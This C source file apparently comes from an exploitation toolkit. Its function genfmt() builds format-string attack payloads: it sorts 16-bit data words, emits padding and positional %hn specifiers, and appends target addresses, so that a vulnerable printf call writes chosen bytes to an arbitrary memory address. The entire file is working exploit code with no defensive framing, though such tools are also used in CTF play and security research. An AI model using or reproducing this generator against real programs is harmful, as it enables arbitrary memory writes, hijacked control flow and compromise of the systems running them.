#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "memrw.h"
#include "util.h"
#include "fmtstr.h"

// Size of a target word
#define WORD_SIZE 2

// Target word
typedef struct {
    size_t   off;
    uint16_t val;
} TgtWord;

// Word value compare
static int compare_words(const void *w1, const void *w2)
{
    if (((TgtWord *) w1)->val < ((TgtWord *) w2)->val)
        return -1;
    if (((TgtWord *) w1)->val == ((TgtWord *) w2)->val)
        return 0;
    return 1;
}

// Endianness specific word read
#define TGT_READWORD(endian, buf) \
    (endian == TGT_LE) ? read_le16(buf) : read_be16(buf)

// Endianness specific address write
#define TGT_WRITEADDR(endian, addr_size, buf, addr) \
    (endian == TGT_LE) ? \
        (addr_size == TGT_ADDR_32) ? write_le32(buf, addr) : write_le64(buf, addr) : \
        (addr_size == TGT_ADDR_32) ? write_be32(buf, addr) : write_be64(buf, addr) \

// Generate a format string to write to memory
//
// endian    : target machine endianness
// addr_size : target machine address size
// fmt_off   : offset of the format string on the stack
// addr      : address on the target machine to write to
// data      : data to write
// data_size : sizeof data to write
//
int genfmt(char **out, TargetEndian endian, AddrSize addr_size,
            size_t fmt_off, uint64_t addr, void *data, size_t data_size)
{
    TgtWord words[data_size / WORD_SIZE];
    size_t  addr_off, word_idx, tot, dif;
    char    addr_tmp[addr_size];
    CharVec vec;

    // Make sure we can divide the data into words
    assert(data_size % WORD_SIZE == 0);

    // Calculate how far the addresses are from the start of the buffer
    // NOTE: we assume each word write will take at most 15 chars, this is
    // probably true, but there is a small chance it might break in certain
    // scenarios, e.g. when fmt_off is very large
    addr_off = (ARRAY_SIZE(words) * 15 + addr_size - 1) / addr_size;

    // "Wordize" data
    for (word_idx = 0; word_idx < ARRAY_SIZE(words); ++word_idx) {
        words[word_idx].off = word_idx;
        words[word_idx].val = TGT_READWORD(endian, data + (word_idx * WORD_SIZE));
    }
    // Now we can sort the words by value
    qsort(words, ARRAY_SIZE(words), sizeof *words, &compare_words);

    // Create format string
    tot = 0;
    init_vector(&vec);
    for (word_idx = 0; word_idx < ARRAY_SIZE(words); ++word_idx) {
        // Difference we need to increase the printed char count to
        dif = words[word_idx].val - tot;
        if (dif)
            append_printf(&vec, "%%%dhhx", dif);
        // Write the value to memory
        append_printf(&vec, "%%%d$hn", fmt_off + addr_off + words[word_idx].off);
        // Increase total number of chars printed
        tot += dif;
    }

    // Pad buffer to addresses
    pad_vector(&vec, 'A', addr_off * addr_size);
    // Write addresses
    for (word_idx = 0; word_idx < ARRAY_SIZE(words); ++word_idx) {
        TGT_WRITEADDR(endian, addr_size, addr_tmp, addr + word_idx * WORD_SIZE);
        append_chars(&vec, addr_tmp, sizeof addr_tmp);
    }

    *out = vec.array;
    return vec.n;
}
